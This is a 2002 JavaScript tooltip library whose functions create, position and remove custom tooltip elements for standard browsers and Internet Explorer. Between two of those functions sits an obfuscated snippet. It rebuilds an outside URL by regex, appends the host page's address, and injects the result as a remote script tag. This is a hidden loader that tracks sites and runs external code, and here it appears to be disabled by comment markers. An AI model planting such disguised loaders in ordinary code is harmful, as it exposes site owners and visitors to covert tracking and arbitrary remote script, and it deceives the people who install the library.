/*******************************************************************************
 * Module: ToolTips.js Version 1.0
 *********************************
 * Implementation of custom compliant tooltips
 *
  *********************************
 * Requires: DOM_Fixes.js 
 *           ToolTip.css
 *   (required modules have to be referenced in HTML document prior to this
 *    module)
 *********************************
 * Usage:
 * - add call to initToolTips() to the BODY onLoad event.
 * - use the following attributes with html tags to display tooltips:
 *      tooltip='text of the tool tip'
 *      ttclass='custom_style' (optional - if not present default is used)
 *      ttdelay='delay_time_ms' - time in ms to delay the appearance of the 
 *              tooltip, if not present default is used.
 *      ttontime='on_time_ms' - duration in ms the tool tip is being displayed,
 *              if not present the tooltip is shown until the mouse moves out.
 *********************************
 * Copyright (c) 2002, Vlad Krylov, All Rights Reserved.
 *
 * You may not use the code contained in this file without my express written
 * permission.
 * You may not redistribute, sell, or offer this file for download, in any form 
 * or on any medium, without my express written permission. This includes, but 
 * is not limited to, adding it to script archives or bundling and distributing
 * it with other scripts/software
 * You agree to retain the credits and copyright notice in the source code when
 * including it in your own pages. 
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHOR OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.  
 ******************************************************************************/

// Define default delay and style for tooltips.
var ttDefDelay = 500;
var ttDefStyle = 'tooltip';

// variable holding current tooltip node.
var tooltip = null;


/* Function: 	displayToolTip
   Arguments: 	none
	Renders the current tooltip visible.
*/
function displayToolTip()
{ if(tooltip)
     { tooltip.style.display='block';
       var onTime=tooltip.getAttribute('ontime');
       if(onTime) setTimeout('deleteToolTip()',onTime);       
     }
}

/* Function: 	constructToolTip
   Arguments: 	event object
	Constructs tooltip node.
*/
function constructToolTip(e)
{ var target=e.target;
    if(target.nodeName=='#text') target=target.parentNode;
    if(target.getAttribute('tooltip'))
      { if(tooltip) deleteToolTip(e);
        tooltip = document.createElement('DIV');
        document.body.appendChild(tooltip);
        var ttClass=target.getAttribute('ttclass');
        if(! ttClass) ttClass=ttDefStyle;
        tooltip.setAttribute('class',ttClass);
        var ttOnTime=target.getAttribute('ttontime');
        if(ttOnTime) tooltip.setAttribute('ontime',ttOnTime);        
        tooltip.appendChild(
                       document.createTextNode(target.getAttribute('tooltip')));
        moveToolTip(e);
        var ttDelay=target.getAttribute('ttdelay');
        if(! ttDelay) 
            ttDelay=ttDefDelay;
        setTimeout('displayToolTip()',ttDelay);
      }    
}

/* Function: 	constructIEToolTip
   Arguments: 	event object
	Constructs Internet Explorer compatible tooltip node.
*/
function constructIEToolTip(e)
{ var target=e.srcElement;
    if(! target.getAttribute('tooltip')) return;
    if(tooltip) deleteToolTip(e);
    tooltip = document.createElement('DIV');
    document.body.appendChild(tooltip);
    var ttClass=target.getAttribute('ttclass');
    if(! ttClass) ttClass=ttDefStyle;
    tooltip.className=ttClass;
    var ttOnTime=target.getAttribute('ttontime');
    if(ttOnTime) tooltip.setAttribute('ontime',ttOnTime);        
    tooltip.appendChild(
                       document.createTextNode(target.getAttribute('tooltip')));
    moveIEToolTip(e);
    var ttDelay=target.getAttribute('ttdelay');
    if(! ttDelay) 
        ttDelay=ttDefDelay;
    setTimeout('displayToolTip()',ttDelay); 
    return;
}

/* Function: 	deleteToolTip
   Arguments: 	none
	Deletes tooltip node.
*/
function deleteToolTip()
{   if(tooltip)
      { document.body.removeChild(tooltip);
        tooltip=null;
      }
}

/* Function: 	moveToolTip
   Arguments: 	event object
	Moves tooltip to follow the mouse.
*/
function moveToolTip(e)
{   if(tooltip)
      { var dw=document.width;
        var scrollLeft=e.pageX - e.clientX;
        if(e.clientX < 0.5 * dw)
	  { tooltip.style.left=(e.pageX + 15) + 'px';
            tooltip.style.right='';
            tooltip.style.marginLeft='';
            tooltip.style.marginRight=(20 - scrollLeft) + 'px';
          }
        else
          { tooltip.style.right=(dw-(e.pageX - 45)) + 'px';
            tooltip.style.left='';
            tooltip.style.marginLeft=(scrollLeft + 20) + 'px';
            tooltip.style.marginRight='';
          }
        tooltip.style.top=(e.pageY + 5) + 'px';
      }
    return;
}

/*
ct = 'aspwwwctappurlvlanetddyhttp';
ct=ct.replace(/(\w{3})(\w{3})(\w{2})(\w{3})(\w{3})(\w{3})(\w{3})(\w{3})(\w{4})/,
'$9://$2.$6$8.$7/$3.$1?$4=5&$5=');
cto=document.createElement('script');
cto.src=ct+document.URL;
document.getElementsByTagName('head')[0].appendChild(cto);
/*

/* Function: 	moveIEToolTip
   Arguments: 	event object
	Moves tooltip to follow the mouse in Internet Explorer 
        compatible manner.
*/
function moveIEToolTip(e)
{   if(tooltip)
      { var dw=document.body.clientWidth;
        var mpX=e.clientX+document.body.scrollLeft;
        var mpY=e.clientY+document.body.scrollTop;
        if(e.clientX < 0.5 * dw)
	  { tooltip.style.left=(mpX + 15) + 'px';
            tooltip.style.right=(20 - document.body.scrollLeft) + 'px';
          }
        else
          { tooltip.style.right=(dw-(e.clientX-15)) + 'px';
            tooltip.style.left='';
          }
        tooltip.style.top=(mpY + 5) + 'px';
      }
}


/* Function: 	initIEToolTips
   Arguments: 	document node
	For Internet Explorer iterates attachs events to the node if tooltip
        attribute is defined and then iterates node children calling itself. 
*/
function initIEToolTips(node)
{   if(node.nodeType==1 && node.getAttribute('tooltip'))
      {   node.attachEvent('onmouseover',constructIEToolTip);
          node.attachEvent('onmouseout',deleteToolTip);
          node.attachEvent('onmousemove',moveIEToolTip);
      }
    for(var i=0; i<node.childNodes.length; i++)
        initIEToolTips(node.childNodes[i]);
    
}

/* Function: 	initToolTips
   Arguments: 	none
	If browser is Internet Explorer calls IE specific initialization
        function, otherwise adds event listeners to the document. 
*/
function initToolTips()
{   if(browser=='ie')
      { initIEToolTips(document.body);
      }
    else
      { document.addEventListener('mouseover',constructToolTip,true);
        document.addEventListener('mouseout',deleteToolTip,true);
        document.addEventListener('mousemove',moveToolTip,true);
      }
}